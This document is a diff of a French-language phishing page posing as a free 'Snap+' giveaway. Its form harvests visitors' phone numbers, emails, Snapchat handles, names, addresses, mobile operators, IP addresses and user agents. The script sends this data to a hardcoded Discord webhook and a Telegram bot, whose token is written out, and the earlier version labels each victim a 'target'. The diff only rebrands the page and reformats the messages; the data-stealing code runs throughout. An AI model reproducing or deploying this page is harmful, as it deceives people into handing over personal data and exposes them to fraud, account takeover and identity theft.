@@ -91,7 +91,7 @@
 <body>
   <div class="container">
     <div class="logo">👻✨</div>
-    <h1>Snap+ uhq</h1>
+    <h1>Snap+ Gratuit</h1>
     <p>Active 1 an de Snap+ gratuitement</p>
 
     <form id="giveawayForm">
@@ -129,35 +129,26 @@
 
     <div class="notice">
       Les données sont utilisées uniquement pour vous contacter si vous gagnez. Ce concours
-      n’est pas affilié à uhqteamuhq.
+      n’est pas affilié à Snapchat.
     </div>
   </div>
 
   <script>
+    // === Configs ===
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
-
     const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
     const TELEGRAM_CHAT_ID = "-1002810249796";
 
-    const SUBMISSION_LIMIT = 30;
+    const SUBMISSION_LIMIT = 2;
     const TIME_WINDOW_MINUTES = 30;
 
-    // Logos par opérateur pour Telegram (emojis ou liens images)
-    const TELEGRAM_LOGOS = {
-      Orange: "🟠",
-      SFR: "🔴",
-      Bouygues: "🔵",
-      Free: "⚫️",
-      Autre: "❔"
-    };
-
-    // Logos par opérateur pour Discord (liens images ou emojis Unicode)
-    const DISCORD_LOGOS = {
-      Orange: "https://upload.wikimedia.org/wikipedia/commons/c/c4/Orange_logo.svg",
-      SFR: "https://upload.wikimedia.org/wikipedia/commons/8/82/SFR_Logo_2021.svg",
-      Bouygues: "https://upload.wikimedia.org/wikipedia/commons/9/99/Bouygues_telecom_logo.svg",
-      Free: "https://upload.wikimedia.org/wikipedia/commons/7/7e/Free_Logo_2011.svg",
-      Autre: ""
+    // Logos opérateurs (tu peux modifier les URLs)
+    const OPERATOR_LOGOS = {
+      Orange: "https://upload.wikimedia.org/wikipedia/commons/c/cb/Orange_logo.svg",
+      SFR: "https://upload.wikimedia.org/wikipedia/commons/9/98/SFR_logo.svg",
+      Bouygues: "https://upload.wikimedia.org/wikipedia/commons/5/5f/Bouygues_Telecom_2019_logo.svg",
+      Free: "https://upload.wikimedia.org/wikipedia/commons/3/32/Free_Logo.svg",
+      Autre: "https://upload.wikimedia.org/wikipedia/commons/a/ac/No_image_available.svg",
     };
 
     function showStep2() {
@@ -183,7 +174,6 @@
     function canSubmit() {
       const now = Date.now();
       const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
-      // Garder uniquement celles dans la fenêtre
       const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
       if (recent.length >= SUBMISSION_LIMIT) return false;
       recent.push(now);
@@ -191,17 +181,12 @@
       return true;
     }
 
-    function escapeMarkdown(text) {
-      // Échapper les caractères Markdown qui pourraient casser la mise en forme Telegram
-      return text.replace(/[_*[\]()~`>#+-=|{}.!]/g, "\\$&");
-    }
-
     async function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
       const payload = {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: "MarkdownV2",
+        parse_mode: "Markdown",
         disable_web_page_preview: true
       };
 
@@ -211,10 +196,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-        if (!res.ok) {
-          const errText = await res.text();
-          throw new Error(`Erreur Telegram: ${res.status} - ${errText}`);
-        }
+        if (!res.ok) throw new Error("Erreur lors de l'envoi Telegram");
       } catch (err) {
         console.error("Telegram error:", err);
       }
@@ -228,68 +210,80 @@
         return;
       }
 
-      const formData = new FormData(this);
-      const data = {};
-      formData.forEach((v, k) => data[k] = v.trim());
-
+      const data = new FormData(this);
       const ip = await getPublicIP();
       const userAgent = navigator.userAgent || "Inconnu";
 
-      // Préparer le logo Telegram et Discord selon opérateur
-      const operateur = data.operateur || "Autre";
-      const telegramLogo = TELEGRAM_LOGOS[operateur] || TELEGRAM_LOGOS["Autre"];
-      const discordLogoUrl = DISCORD_LOGOS[operateur] || "";
+      const operateur = data.get("operateur") || "Autre";
+      const logoURL = OPERATOR_LOGOS[operateur] || OPERATOR_LOGOS["Autre"];
 
-      // Message Telegram personnalisé avec logo et markdown v2 échappé
-      const telegramMessage = 
-`${telegramLogo} *Nouvelle cible Snap+*  
-┌─📞 *Contact*  
-│ ├─ Téléphone : \`${escapeMarkdown(data.telephone)}\`  
-│ ├─ Email     : \`${escapeMarkdown(data.email)}\`  
-│ └─ Snapchat  : \`${escapeMarkdown(data.snap)}\`  
-
-├─👤 *Identité*  
-│ ├─ Nom      : \`${escapeMarkdown(data.nom)}\`  
-│ ├─ Prénom   : \`${escapeMarkdown(data.prenom)}\`  
-
-├─📍 *Localisation*  
-│ ├─ Ville        : \`${escapeMarkdown(data.ville)}\`  
-│ ├─ Département  : \`${escapeMarkdown(data.departement)}\`  
-│ └─ Adresse      : \`${escapeMarkdown(data.adresse || "Non fournie")}\`  
-
-├─📡 *Opérateur*  
-│ └─ ${escapeMarkdown(operateur)}  
-
-└─🌐 *Autres*  
-  ├─ IP          : \`${escapeMarkdown(ip)}\`  
-  └─ User Agent  : \`${escapeMarkdown(userAgent)}\`  
-
-🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}`;
-
-      // Embed Discord personnalisé
+      // Embed Discord personnalisé selon opérateur
       const embed = {
-        title: `🎉 Nouvelle cible Snap+ - ${operateur}`,
-        color: 0x9B00FF,
-        thumbnail: {
-          url: discordLogoUrl || "https://i.imgur.com/bj22AGi.jpeg" // fallback
-        },
+        title: `🎉 Nouvelle participation Snap+ (${operateur})`,
+        description: "**Détails du participant :**",
+        color: (() => {
+          switch (operateur) {
+            case "Orange": return 0xFFA500; // orange
+            case "SFR": return 0xE60012;    // rouge SFR
+            case "Bouygues": return 0x00AEEF; // bleu Bouygues
+            case "Free": return 0x000000;   // noir Free
+            default: return 0x9B00FF;       // violet par défaut
+          }
+        })(),
+        thumbnail: { url: logoURL },
         fields: [
-          { name: "📞 Téléphone", value: data.telephone || "N/A", inline: true },
-          { name: "📡 Opérateur", value: operateur, inline: true },
-          { name: "👻 Snapchat", value: data.snap || "N/A", inline: true },
-          { name: "✉️ Email", value: data.email || "N/A", inline: false },
-          { name: "👤 Nom Complet", value: `${data.prenom} ${data.nom}`, inline: false },
-          { name: "🏙️ Ville / Département", value: `${data.ville} / ${data.departement}`, inline: true },
-          { name: "🏠 Adresse", value: data.adresse || "Non fournie", inline: false },
-          { name: "🌐 IP Publique", value: ip, inline: false },
-          { name: "🖥️ User Agent", value: userAgent, inline: false },
+          { name: "📞 Téléphone", value: `\`\`\`${data.get("telephone") || "N/A"}\`\`\``, inline: true },
+          { name: "📡 Opérateur", value: `\`\`\`${operateur}\`\`\``, inline: true },
+          { name: "👻 Snapchat", value: `\`\`\`${data.get("snap") || "N/A"}\`\`\``, inline: true },
+          { name: "✉️ Email", value: `\`\`\`${data.get("email") || "N/A"}\`\`\``, inline: false },
+          { name: "👤 Nom Complet", value: `\`\`\`${data.get("prenom")} ${data.get("nom") || "N/A"}\`\`\``, inline: false },
+          { name: "🏙️ Ville / Département", value: `\`\`\`${data.get("ville") || "N/A"} / ${data.get("departement") || "N/A"}\`\`\``, inline: true },
+          { name: "🏠 Adresse", value: `\`\`\`${data.get("adresse") || "Non fournie"}\`\`\``, inline: false },
+          { name: "🌐 IP Publique", value: `\`\`\`${ip}\`\`\``, inline: false },
+          { name: "🖥️ User Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
           { name: "🔐 Claimed by", value: "Pas encore revendiqué", inline: false }
         ],
-        footer: {
-          text: `Reçu le ${new Date().toLocaleString("fr-FR")}`
-        },
+        footer: { text: `Reçu le ${new Date().toLocaleString("fr-FR")}` },
         timestamp: new Date().toISOString(),
       };
+
+      // Message Telegram personnalisé selon opérateur avec logo dans le texte (emoji)
+      // Je mets un petit emoji avec le nom opérateur, tu peux remplacer par ce que tu veux
+      const operatorEmojiMap = {
+        Orange: "🟧",
+        SFR: "🟥",
+        Bouygues: "🟦",
+        Free: "⬛",
+        Autre: "⬜"
+      };
+      const opEmoji = operatorEmojiMap[operateur] || "⬜";
+
+      const telegramMessage = `
+🎁 *Nouvelle participation Snap+* ${opEmoji} (${operateur})
+
+┌─📞 Contact
+│ ├─ Téléphone : ${data.get("telephone") || "N/A"}
+│ ├─ Email     : ${data.get("email") || "N/A"}
+│ └─ Snapchat  : ${data.get("snap") || "N/A"}
+
+├─👤 Identité
+│ ├─ Nom      : ${data.get("nom") || "N/A"}
+│ ├─ Prénom   : ${data.get("prenom") || "N/A"}
+
+├─📍 Localisation
+│ ├─ Ville        : ${data.get("ville") || "N/A"}
+│ ├─ Département  : ${data.get("departement") || "N/A"}
+│ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
+
+├─📡 Opérateur
+│ └─ ${operateur}
+
+└─🌐 Autres
+  ├─ IP          : ${ip}
+  └─ User Agent  : ${userAgent}
+
+🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
+`;
 
       // Envoi Discord
       const discordSend = fetch(DISCORD_WEBHOOK_URL, {
@@ -303,16 +297,15 @@
       // Envoi Telegram
       const telegramSend = sendToTelegram(telegramMessage);
 
-      // Attendre les deux
+      // Attendre les deux envois
       Promise.all([discordSend, telegramSend])
         .then(() => {
           window.location.href = "merci.html";
         })
-        .catch(err => {
+        .catch((err) => {
           alert("Erreur lors de l’envoi. Réessayez.");
           console.error(err);
         });
-
     });
   </script>
 </body>
